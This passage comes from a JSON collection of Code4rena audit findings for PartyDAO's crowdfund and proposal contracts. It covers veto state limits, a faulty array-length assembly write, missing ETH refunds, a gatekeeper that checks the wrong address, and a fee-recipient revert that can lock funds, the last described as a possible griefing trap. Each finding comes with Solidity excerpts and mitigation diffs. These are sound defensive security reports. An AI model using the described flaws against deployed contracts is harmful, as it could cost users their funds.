      "summary": "\nThis bug report concerns the [`VetoProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69) contract which allows users to veto proposals with the [`voteToVeto`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60) function. Currently, the `voteToVeto` function only allows users to veto proposals when they are in the `Voting` state. However, it has been confirmed by the sponsor that the `voteToVeto` function should not restrict the situations in which vetos can occur and that it should also be possible to veto the proposal in the `Passed` and `Ready` states. This means that users are not able to veto in the `Passed` and `Ready` states even though it should be possible. This issue can be fixed by allowing the `VetoProposal.voteToVeto` function to be called in the `Passed` and `Ready` states as well. The recommended mitigation step is to make the necessary changes to the code, as indicated by the proof of concept.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/3",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "hansfriese"
      ]
    },
    {
      "id": "19998",
      "title": "[M-11] `CollectionBatchBuyOperator.sol`: `tokenIds` array is not shortened properly which makes execute function revert when not all NFTs are purchased successfully",
      "impact": "MEDIUM",
      "content": "\nThe [`CollectionBatchBuyOperator`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224) contract allows parties to buy NFTs through proposals.\n\nThe proposal specifies an `nftContract` and token IDs (via the `nftTokenIdsMerkleRoot` parameter) that can be bought.\n\nAllowed `executors` can then execute the actual purchase by executing the proposal and providing execution data.\n\nThe execution data specifies which token IDs to buy, where to buy them from and the price to buy the tokens for.\n\nThe `CollectionBatchBuyOperator.execute` function is supposed to succeed even when not all purchases are successful.\n\nThis is achieved by skipping over failed purchases:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L132-L137)\n\n```solidity\n{\n    // Execute the call to buy the NFT.\n    (bool success, ) = _buy(call.target, callValue, call.data);\n\n\n    if (!success) continue;\n}\n```\n\nLater in the function the NFTs that have been bought are transferred to the party:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L186-L188)\n\n```solidity\nfor (uint256 i; i < tokenIds.length; ++i) {\n    op.nftContract.safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n}\n```\n\nIf at least one NFT purchase has failed, the `tokenIds` array is bigger than the amount of NFTs that has actually been purchased. In other words there are empty spots at the end of the `tokenIds` array, i.e. the value that is stored there is zero.\n\nTherefore, before transferring the NFTs, the `tokenIds` array needs to be shortened such that it is not attempted to transfer `tokenId=0`.\n\nThe contract uses the following code to achieve this:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183)\n\n```solidity\nassembly {\n    // Update length of `tokenIds`\n    mstore(mload(ex), tokensBought)\n}\n```\n\nThis code is wrong as I will explain later.\n\nThe impact of this is that when not all purchases are successful the function reverts because it attempts to transfer the `tokenId=0` (since there are empty spots in the `tokenIds` array and the array is not shortened).\n\nSo the execution of the proposal will fail when it should actually succeed.\n\n### Proof of Concept\n\nLet's have a look again at the code to shorten the `tokenIds` array:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183)\n\n```solidity\nassembly {\n    // Update length of `tokenIds`\n    mstore(mload(ex), tokensBought)\n}\n```\n\nIt loads the first 32 bytes of `ex` from memory (`ex` is a `CollectionBatchBuyExecutionData` struct) and stores `tokensBought` in the memory location where the 32 bytes point to.\n\nThis has nothing to do with shortening the `tokenIds` array.\n\nThe correct code would be:\n\n```solidity\nassembly {\n    // Update length of `tokenIds`\n    mstore(tokenIds, tokensBought)\n}\n```\n\nThis writes `tokensBought` to the first 32 bytes slot of the `tokenIds` array which is where the size of the array is stored.\n\nThere exists a test case for this scenario in the `CollectionBatchBuyOperator.t.sol` test file. However the test contains an error which makes the test pass even though the `tokenIds` array is not shortened.\n\nApply these changes to the test file:\n\n```diff\ndiff --git a/sol-tests/operators/CollectionBatchBuyOperator.t.sol b/sol-tests/operators/CollectionBatchBuyOperator.t.sol\nindex 3956e84..a944c74 100644\n--- a/sol-tests/operators/CollectionBatchBuyOperator.t.sol\n+++ b/sol-tests/operators/CollectionBatchBuyOperator.t.sol\n@@ -165,7 +165,7 @@ contract CollectionBatchBuyOperatorTest is Test, TestUtils, ERC721Receiver {\n         bytes memory executionData = abi.encode(\n             CollectionBatchBuyOperator.CollectionBatchBuyExecutionData({\n                 calls: calls,\n-                numOfTokens: 2\n+                numOfTokens: 3\n             })\n         );\n```\n\nNotice that when running the test (with the changes to the test file applied) it fails since the `tokenIds` array is not shortened properly.\n\nThen also apply the changes to the source file (shortening the array properly) and see that the test passes.\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nAs explained above, this is how to properly shorten the `tokenIds` array:\n\n```diff\ndiff --git a/contracts/operators/CollectionBatchBuyOperator.sol b/contracts/operators/CollectionBatchBuyOperator.sol\nindex 4b1dcc9..fffa5e9 100644\n--- a/contracts/operators/CollectionBatchBuyOperator.sol\n+++ b/contracts/operators/CollectionBatchBuyOperator.sol\n@@ -179,7 +179,7 @@ contract CollectionBatchBuyOperator is IOperator {\n \n         assembly {\n             // Update length of `tokenIds`\n-            mstore(mload(ex), tokensBought)\n+            mstore(tokenIds, tokensBought)\n         }\n```\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/4#issuecomment-1512077491)**\n\n\n\n***\n\n",
      "summary": "\nThe CollectionBatchBuyOperator contract allows parties to buy Non-Fungible Tokens (NFTs) through proposals. The proposal specifies an nftContract and token IDs that can be bought. Allowed executors can then execute the actual purchase by providing execution data that specifies which token IDs to buy, where to buy them from, and the price to buy the tokens for. The CollectionBatchBuyOperator.execute function is supposed to succeed even when not all purchases are successful, which is achieved by skipping over failed purchases.\n\nHowever, if at least one NFT purchase has failed, the tokenIds array is bigger than the amount of NFTs that has actually been purchased, containing empty spots at the end of the array. Before transferring the NFTs, the tokenIds array needs to be shortened such that it is not attempted to transfer tokenId=0.\n\nThe contract uses the wrong code to achieve this, which causes the execution of the proposal to fail when it should actually succeed. This is demonstrated by a Proof of Concept, where changes were made to the test file and source file to properly shorten the tokenIds array and make the test pass. The recommended mitigation step is to apply the changes to the source file, which will properly shorten the tokenIds array.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/4",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "hansfriese"
      ]
    },
    {
      "id": "19997",
      "title": "[M-10] `OperatorProposal.sol`: Leftover ETH is not refunded to the `msg.sender`",
      "impact": "MEDIUM",
      "content": "\nThe [`OperatorProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L7-L63) contract is a type of proposal that allows to execute operations on contracts that implement the [`IOperator`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/operators/IOperator.sol) interface.\n\nUpon execution of the proposal it might be necessary that the `executor` provides ETH.\n\nThis is true especially when `allowOperatorsToSpendPartyEth=false`, i.e. when ETH cannot be spent from the Party's balance. So it must be provided by the `executor`.\n\nThe amount of ETH that is needed to execute the operation is sent to the operator contract:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L45)\n\n```solidity\ndata.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);\n```\n\nThe operator contract then spends whatever amount of ETH is actually necessary and returns the remaining ETH.\n\nFor example the [`CollectionBatchBuyOperator`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224) contract may not spend all of the ETH because the actual purchases that are made are not necessarily known at the time the proposal is created. Also not all purchases may succeed.\n\nSo it is clear that some of the ETH may be returned from the `operator` to the `OperatorProposal` contract.\n\nThe issue is that the remaining ETH is not refunded to the `executor` and therefore this results in a direct loss of funds for the `executor`.\n\nI discussed this issue with the sponsor and it is clear that the remaining ETH needs to be refunded when `allowOperatorsToSpendPartyEth=false`.\n\nHowever it is not clear what to do when `allowOperatorsToSpendPartyEth=true`. In this case ETH can be spent from the party's balance. So there should be limited use cases for the `executor` providing additional ETH.\n\nBut if the `executor` provides additional ETH what should happen?\n\nShould the ETH be taken from the `executor` first? Or should it be taken from the Party balance first?\n\nThe sponsor mentioned that since there are limited use cases for the `executor` providing additional ETH it may be ok to not refund ETH at all.\n\nI disagree with this. Even when `allowOperatorsToSpendPartyEth=true` there should be a policy for refunds. I.e. the necessary ETH should either be taken from the Party's balance or from the `executor` first and any remaining funds from the `executor` should be returned.\n\nHowever since it is not clear how to proceed in this case and since it is less important compared to the case where `allowOperatorsToSpendPartyEth=false` I will only make a suggestion for the case where `allowOperatorsToSpendPartyEth=false`.\n\nThe sponsor should decide what to do in the other case and make the appropriate changes.\n\n### Proof of Concept\n\nWhen the `executor` executes an `OperatorProposal`, `operatorValue` amount of ETH is sent to the `operator` contract (when `allowOperatorsToSpendPartyEth=false` all of these funds must come from the `msg.value`):\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L40-L45)\n\n```solidity\nif (!allowOperatorsToSpendPartyEth && data.operatorValue > msg.value) {\n    revert NotEnoughEthError(data.operatorValue, msg.value);\n}\n\n\n// Execute the operation.\ndata.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);\n```\n\nCurrently the only `operator` contract that is implemented is the `CollectionBatchBuyOperator` and as explained above not all of the funds may be used so the funds are sent back to the Party:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L191-L192)\n\n```solidity\nuint256 unusedEth = msg.value - totalEthUsed;\nif (unusedEth > 0) payable(msg.sender).transferEth(unusedEth);\n```\n\nHowever after calling the `operator` contract, the `OperatorProposal` contract just returns without sending back the unused funds to the `executor` (`msg.sender`).\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L47-L48)\n\n```solidity\n// Nothing left to do.\nreturn \"\";\n```\n\nSo there is a loss of funds for the `executor`. The leftover funds are effectively transferred to the Party.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nAs mentioned before, this is only a fix for the case when `allowOperatorsToSpendPartyEth=false`.\n\nFix:\n\n```diff\ndiff --git a/contracts/proposals/OperatorProposal.sol b/contracts/proposals/OperatorProposal.sol\nindex 23e2897..507e0d5 100644\n--- a/contracts/proposals/OperatorProposal.sol\n+++ b/contracts/proposals/OperatorProposal.sol\n@@ -4,7 +4,11 @@ pragma solidity 0.8.17;\n import \"./IProposalExecutionEngine.sol\";\n import \"../operators/IOperator.sol\";\n \n+import \"../utils/LibAddress.sol\";\n+\n contract OperatorProposal {\n+    using LibAddress for address payable;\n+    \n     struct OperatorProposalData {\n         // Addresses that are allowed to execute the proposal and decide what\n         // calldata used by the operator proposal at the time of execution.\n@@ -41,9 +45,17 @@ contract OperatorProposal {\n             revert NotEnoughEthError(data.operatorValue, msg.value);\n         }\n \n+        uint256 partyBalanceBefore = address(this).balance - msg.value;\n+\n         // Execute the operation.\n         data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);\n \n+        if (!allowOperatorsToSpendPartyEth) {\n+            if (address(this).balance - partyBalanceBefore > 0) {\n+                payable(msg.sender).transferEth(address(this).balance - partyBalanceBefore);\n+            }\n+        }\n+\n         // Nothing left to do.\n         return \"\";\n     }\n```\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1509854381):**\n > Looking forward to sponsor comment on this. As described in my comment on [`#30`](https://github.com/code-423n4/2023-04-party-findings/issues/30#issuecomment-1509847694), I am not entirely sure that this qualifies as Medium based on the fact that the caller presumably is able to call with the correct value. QA may be more appropriate.\n\n**[HollaDieWaldfee (warden) commented](https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1509855041):**\n > @0xean - It is not true that the caller can just use the function with the correct value:\n> \n> > \"For example the [CollectionBatchBuyOperator](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224) contract may not spend all of the ETH because the actual purchases that are made are not necessarily known at the time the proposal is created. Also not all purchases may succeed.\"\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1511998345):**\n > @HollaDieWaldfee is right, there is at least one case with the `CollectionBatchBuyOperator` where it may not use all the ETH and the user may expect to be refunded. I think marking as Medium is valid.\n\n\n\n***\n\n",
      "summary": "\nThe OperatorProposal contract is a type of proposal that allows to execute operations on contracts that implement the IOperator interface. When the executor executes an OperatorProposal, operatorValue amount of ETH is sent to the operator contract. The only operator contract that is implemented is the CollectionBatchBuyOperator, and not all of the funds may be used so the funds are sent back to the Party. However, after calling the operator contract, the OperatorProposal contract just returns without sending back the unused funds to the executor, resulting in a loss of funds. \n\nThe recommended mitigation steps are to add code to the OperatorProposal contract so that when allowOperatorsToSpendPartyEth is false, any remaining funds from the executor are returned. When allowOperatorsToSpendPartyEth is true, it is not clear what to do, but the sponsor should decide and make the appropriate changes. The code change is provided as a proof of concept. \n\nThe issue was discussed with the sponsor and it was confirmed that the remaining ETH needs to be refunded when allowOperatorsToSpendPartyEth is false. The issue was marked as Medium based on the fact that the caller may not be able to call with the correct value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/5",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "hansfriese"
      ]
    },
    {
      "id": "19996",
      "title": "[M-09] `InitialETHCrowdfund` + `ReraiseETHCrowdfund`: Gatekeeper checks wrong address",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L215-L226>\n\nThis vulnerability exists in both the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) and [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contracts in exactly the same way.\n\nI will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.\n\nWhen making a contribution there is a check with the `gatekeeper` (if it is configured):\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293)\n\n```solidity\n// Must not be blocked by gatekeeper.\nIGateKeeper _gateKeeper = gateKeeper;\nif (_gateKeeper != IGateKeeper(address(0))) {\n    if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n        revert NotAllowedByGateKeeperError(\n            contributor,\n            _gateKeeper,\n            gateKeeperId,\n            gateData\n        );\n    }\n}\n```\n\nThe issue is that the first argument to the `isAllowed` function is wrong. It is `contributor` but it should be `msg.sender`.\n\nThe impact of this is that it will be possible for unauthorized users to make contributions.\n\n### Proof of Concept\n\nFortunately the new `InitialETHCrowdfund` and `ReraiseETHCrowdfund` contracts are very similar to the already audited other crowdfund contracts.\n\nSo we can look into the `Crowdfund.sol` code and see how the `gatekeeper.isAllowed` function should be called:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L620-L644)\n\n```solidity\n    function _contribute(\n        address contributor,\n        address delegate,\n        uint96 amount,\n        uint96 previousTotalContributions,\n        bytes memory gateData\n    ) private {\n        if (contributor == address(this)) revert InvalidContributorError();\n\n\n        if (amount == 0) return;\n\n\n        // Must not be blocked by gatekeeper.\n        {\n            IGateKeeper _gateKeeper = gateKeeper;\n            if (_gateKeeper != IGateKeeper(address(0))) {\n                if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {\n                    revert NotAllowedByGateKeeperError(\n                        msg.sender,\n                        _gateKeeper,\n                        gateKeeperId,\n                        gateData\n                    );\n                }\n            }\n        }\n```\n\nWe can see that the first argument to the `gatekeeper.isAllowed` function is `msg.sender`.\n\nThis means that when User A contributes for User B, the address that is checked is the address of User A and not the address of User B.\n\nThe new crowdfund contracts however check `contributor`:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293)\n\n```solidity\n// Must not be blocked by gatekeeper.\nIGateKeeper _gateKeeper = gateKeeper;\nif (_gateKeeper != IGateKeeper(address(0))) {\n    if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n        revert NotAllowedByGateKeeperError(\n            contributor,\n            _gateKeeper,\n            gateKeeperId,\n            gateData\n        );\n    }\n}\n```\n\nThis means that when User A contributes for User B, the address of User B is checked. However it should be the address of User A (as seen above).\n\nImagine a situation where three addresses are whitelisted by the gatekeeper:\n\n    Alice\n    Bob\n    Chris\n\nWhat should be checked by the gatekeeper is that only Alice, Bob and Chris can make contributions but they should be able to make contributions for everyone (check `msg.sender` instead of contributor).\n\nWhat is actually checked is that any user can make a contribution but they can only contribute to Alice, Bob and Chris (check contributor instead of `msg.sender`).\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIn both contracts the `msg.sender` needs to be checked instead of `contributor`.\n\n```diff\ndiff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol\nindex 8ab3b5c..fa8ec5d 100644\n--- a/contracts/crowdfund/InitialETHCrowdfund.sol\n+++ b/contracts/crowdfund/InitialETHCrowdfund.sol\n@@ -282,9 +282,9 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n         // Must not be blocked by gatekeeper.\n         IGateKeeper _gateKeeper = gateKeeper;\n         if (_gateKeeper != IGateKeeper(address(0))) {\n-            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n+            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {\n                 revert NotAllowedByGateKeeperError(\n-                    contributor,\n+                    msg.sender,\n                     _gateKeeper,\n                     gateKeeperId,\n                     gateData\n```\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..72f3a20 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -215,9 +215,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n         // Must not be blocked by gatekeeper.\n         IGateKeeper _gateKeeper = gateKeeper;\n         if (_gateKeeper != IGateKeeper(address(0))) {\n-            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n+            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {\n                 revert NotAllowedByGateKeeperError(\n-                    contributor,\n+                    msg.sender,\n                     _gateKeeper,\n                     gateKeeperId,\n                     gateData\n```\n\nOn this note it is important to mention that there is also an issue in `Crowdfund.sol` which is out of scope but the issue is of importance here:\n\nThe issue is in the `Crowdfund.batchContributeFor` function.\n\nThe function calls `this.contributeFor` [Link](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L365-L368).\n\nSo when the call is made, `msg.sender` is the address of the crowdfund and not the address of the user.\n\nTherefore the gatekeeper check is wrong [Link](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L596).\n\nThis is clearly not how the gatekeeper should be used. The gatekeeper should check the address of the user.\n\nIf you implement in the `ReraiseETHCrowdfund` and `InitialETHCrowdfund` contracts the changes I suggested, the same issue will be introduced there.\n\nThe solution is to call `_contributeFor` directly and to remove the `revertOnFailure` option. Or do a more involved change with supplying the correct `msg.sender`.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/6#issuecomment-1509386073):**\n > Will leave open for sponsor review. \n> \n> I think the crux of it comes down to this assumption by the warden:\n> \n> > \"This is clearly not how the gatekeeper should be used. The gatekeeper should check the address of the user.\"\n> \n> I believe the design is meant to check instead for the address of the `contributor` but cannot find that explicitly documented. \n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/6#issuecomment-1512009109):**\n > I think it makes the most sense to be consistent with the behavior of prior crowdfunds here. Will implement the recommended mitigation.\n> \n> The note about `Crowdfund.batchContributeFor` is also interesting and something we'll look into. Very glad it was brought up even though it was out of scope.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) and [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contracts. When making a contribution, there is a check with the `gatekeeper`. The issue is that the first argument to the `isAllowed` function is wrong. It is `contributor` but it should be `msg.sender`. \n\nThe impact of this is that it will be possible for unauthorized users to make contributions. The proof of concept was to look into the `Crowdfund.sol` code and see how the `gatekeeper.isAllowed` function should be called. It should be checked that only whitelisted users can make contributions but they should be able to make contributions for everyone (check `msg.sender` instead of contributor).\n\nThe recommended mitigation steps for this bug are to change both contracts so that `msg.sender` is checked instead of `contributor`. Additionally, the note about `Crowdfund.batchContributeFor` should be looked into.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/6",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "19995",
      "title": "[M-08] `ETHCrowdfundBase.sol`: All funds are lost when fee recipient cannot receive ETH",
      "impact": "MEDIUM",
      "content": "\nIn the [`ETHCrowdfundBase`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ETHCrowdfundBase.sol) contract a [`fundingSplitRecipient`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L142) address is configured which receives a percentage of the funds in case the crowdfund is won.\n\nNeither the `fundingSplitRecipient` address nor the `fundingSplitBps` percentage can be changed.\n\nThe issue is that the `_finalize` function can only succeed when the fees can be transferred to the recipient.\n\nHowever the recipient contract may revert when it receives ETH. This causes all ETH in the `ETHCrowdfundBase` contract to be stuck.\n\n### Proof of Concept\n\nWhen the crowdfund is won the `finalize` function needs to be called which calls `_finalize`:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292)\n\n```solidity\nfunction _finalize(uint96 totalContributions_) internal {\n    // Finalize the crowdfund.\n    delete expiry;\n\n\n    // Update the party's total voting power.\n    uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\n    party.increaseTotalVotingPower(newVotingPower);\n\n\n    // Transfer fee to recipient if applicable.\n    address payable fundingSplitRecipient_ = fundingSplitRecipient;\n    uint16 fundingSplitBps_ = fundingSplitBps;\n    if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n        uint96 feeAmount = (totalContributions_ * fundingSplitBps_) / 1e4;\n        totalContributions_ -= feeAmount;\n        fundingSplitRecipient_.transferEth(feeAmount);\n    }\n\n\n    // Transfer ETH to the party.\n    payable(address(party)).transferEth(totalContributions_);\n}\n```\n\nHere you can see that the `feeAmount` is transferred to the `fundingSplitRecipient`:\n\n```solidity\nfundingSplitRecipient_.transferEth(feeAmount);\n```\n\nIf the recipient contract reverts, the ETH cannot be transferred and the crowdfund cannot be finalized.\n\nBut the users can also not get a refund because the crowdfund is in the `Won` state. So there is no way to get the funds out of the contract which means they are lost. Also the users don't get the voting power that they are supposed to get from the crowdfund.\n\nThis could be used in a griefing attack where the `fundingSplitRecipient` is set such that it can be made to revert.\n\nUsers that fall into this \"trap\" will lose all their funds. It can also just happen by mistake that a bad `fundingSplitRecipient` is set.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nI recommend to pay the fees in a separate function such that it is separated from the `_finalize` function.\n\n```diff\ndiff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol\nindex 4392655..5f68406 100644\n--- a/contracts/crowdfund/ETHCrowdfundBase.sol\n+++ b/contracts/crowdfund/ETHCrowdfundBase.sol\n@@ -62,6 +62,8 @@ contract ETHCrowdfundBase is Implementation {\n     error BelowMinimumContributionsError(uint96 contributions, uint96 minContributions);\n     error AboveMaximumContributionsError(uint96 contributions, uint96 maxContributions);\n     error ContributingForExistingCardDisabledError();\n+    error NotFinalizedError();\n+    error FundingFeesAlreadyPaidError();\n \n     event Contributed(\n         address indexed sender,\n@@ -109,6 +111,8 @@ contract ETHCrowdfundBase is Implementation {\n     /// @notice The address a contributor is delegating their voting power to.\n     mapping(address => address) public delegationsByContributor;\n \n+    bool public fundingFeesPaid;\n+\n     // Initialize storage for proxy contracts, credit initial contribution (if\n     // any), and setup gatekeeper.\n     function _initialize(ETHCrowdfundOptions memory opts) internal {\n@@ -278,7 +282,20 @@ contract ETHCrowdfundBase is Implementation {\n         uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\n         party.increaseTotalVotingPower(newVotingPower);\n \n+        // Transfer ETH to the party.\n+        payable(address(party)).transferEth(totalContributions_);\n+    }\n+\n+    function sendFundingFees() external {\n+        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n+        \n+        if (lc != CrowdfundLifecycle.Finalized) revert NotFinalizedError();\n+        if (fundingFeesPaid) revert FundingFeesAlreadyPaidError();\n+\n+        fundingFeesPaid = true;\n+\n         // Transfer fee to recipient if applicable.\n+        uint96 totalContributions_ = totalContributions;\n         address payable fundingSplitRecipient_ = fundingSplitRecipient;\n         uint16 fundingSplitBps_ = fundingSplitBps;\n         if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n@@ -286,8 +303,5 @@ contract ETHCrowdfundBase is Implementation {\n             totalContributions_ -= feeAmount;\n             fundingSplitRecipient_.transferEth(feeAmount);\n         }\n-\n-        // Transfer ETH to the party.\n-        payable(address(party)).transferEth(totalContributions_);\n     }\n }\n```\n\nAlternatively it may also be an option to just send the fees to the party in case the transfer to the recipient fails.\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/8#issuecomment-1512082533)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `ETHCrowdfundBase` contract, part of the 2023-04-party project on GitHub. In this contract, a `fundingSplitRecipient` address is configured which receives a percentage of the funds in case the crowdfund is won. The issue is that the `_finalize` function can only succeed when the fees can be transferred to the recipient. However, if the recipient contract reverts when it receives ETH, all ETH in the `ETHCrowdfundBase` contract will be stuck. This could be used in a griefing attack where the `fundingSplitRecipient` is set such that it can be made to revert, causing users to lose all their funds. It can also happen by mistake that a bad `fundingSplitRecipient` is set.\n\nThe recommended mitigation steps for this issue are to pay the fees in a separate function such that it is separated from the `_finalize` function, or alternatively to just send the fees to the party in case the transfer to the recipient fails.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/8",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "19994",
      "title": "[M-07] `totalVotingPower` needs to be snapshotted for each proposal because it can change and thereby affect consensus when accepting / vetoing proposals",
      "impact": "MEDIUM",
